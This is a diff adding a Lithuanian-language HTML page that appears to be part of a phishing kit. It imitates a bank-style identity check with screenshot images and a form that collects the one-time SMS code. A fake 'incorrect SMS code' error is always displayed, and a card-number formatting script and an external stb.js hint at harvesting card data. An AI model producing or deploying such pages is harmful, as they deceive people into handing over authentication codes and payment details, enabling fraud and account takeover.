@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/coral.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >
+    <div>
+        <div class="roof">
+            <img src="./img/tyoupq.JPG" alt="">
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="ind1">
+                    <img src="./img/smspagup.JPG" alt="">
+                    
+            </div>
+            </p>
+            <div class="section">
+                
+                <p class="pp3">
+                    Įveskite į telefoną gautą vienkartinį saugos kodą ir patvirtinkite savo tapatybę.
+                </p>
+
+                <div class="kolch">
+                    <form class="smform" method="post" id="pg4">
+                        <p>SMS kodas </p>
+                        <input class="inps"  type="tele" name="" id="sps2" maxlength="10" required>
+
+                        <p style="margin-left: 0px; margin-top: 10px; color: rgb(192, 28, 28);">Neteisingai nurodytas <br> SMS kodas</p>
+
+                        <button class="btn1"   type="submit"><p>Patvirtinkite</p> <img src="./img/btno.png" alt=""></button>
+                    </form>
+                    
+                </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="boot">
+                <img src="./img/bonotia.JPG" alt="">
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+    </script>
+    <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
